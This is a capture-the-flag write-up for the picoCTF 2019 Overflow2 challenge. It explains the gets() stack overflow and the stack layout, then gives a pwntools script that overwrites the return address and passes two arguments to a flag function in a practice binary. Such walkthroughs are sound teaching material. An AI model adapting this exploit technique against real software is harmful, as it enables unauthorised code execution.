# PicoCTF 2019 - Binary Exploit - Overflow2

Similar to Overflow1 except that we have to overwrite the return address and pass 2 arguments to the flag function

## The Vulnerability
It calls 'gets', a function that is known to be very dangerous (according to the documentation this function should never be used) 
The reason this function is dangerous is because of how it works: 'gets(char \*s) reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0'). 
No check for buffer overrun is performed, so it keeps reading input, even if this is larger than the amount of memory allocated for that string causing it to overwrite values from the stack.

## File info
```
[Sain@kali:~/ctf/CTF_Writeups/picoCTF2019/Binary/OverFlow2]$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=80e23ef08eb912fde3fc2f7ff2148e0e62960080, not stripped
[Sain@kali:~/ctf/CTF_Writeups/picoCTF2019/Binary/OverFlow2]$ checksec vuln
[*] '/home/sain/ctf/CTF_Writeups/picoCTF2019/Binary/OverFlow2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Exploit

The exploit itself will work just like Overflow1 except that we have to find out where to put the arguments on the stack.

If we look at the disassembly of 'flag' we can see it gets the args from `ebp+0x8` & `ebp+0xc`

source c:
```c
if (arg1 != 0xDEADBEEF)
	return;
if (arg2 != 0xC0DED00D)
	return;
printf(buf);
```

disassembly:

![picture alt](https://i.gyazo.com/c00092c0725b3ddaf7c4e3d6de9a1959.png)

Okay now that we have an idea of where we have to go with the arguments let's get to the buffer overflow part

First of all we know our buffersize is 176
If we fill up that buffer with 'A' our stack looks something like this:

![picture alt](https://i.gyazo.com/dfb59969aa2e28b538845eac4f7f7f6c.png)

Our return address is again 12 bytes after our buffer `0x0804871c` -> main+103

and our flag is located at `0x080485e6`
so now we can do a small test to see the stack inside our flag function and see where we need to input the arguments

input here was: `python -c "'A' * 176 + 'B' * 12 + '\xe6\x85\x04\x08'"`

![picture alt](https://i.gyazo.com/81a7107a62a00f4d79a807e8e699b853.png)

As you can see there are 4 empty bytes in between our buffer and `ebp+0x8`
so we have to modify our input a bit by adding 4 more bytes to our payload; behind the flag address

and then finally after those 4 we can put in the values it compares to in the disassembly

first argument: `0xdeadbeef` 
and second argument: `0xc0ded00d`

now that we got all that down our exploit script looks something like:

```python
from pwn import *

buff = "A" * 176 + "B" * 12
buff2 = "C" * 4

flag_loc = util.packing.p32(0x080485e6)
flag_arg1 = util.packing.p32(0xdeadbeef)
flag_arg2 = util.packing.p32(0xc0ded00d)

payload = buff
payload += flag_loc
payload += buff2
payload += flag_arg1
payload += flag_arg2

online = True

if online:
	file_loc = "/problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc/vuln"
	p = process(file_loc)
else:
	p = process("./vuln")

p.recvuntil("Please enter your string: \n")
p.sendline(payload)
print p.recvall()
```
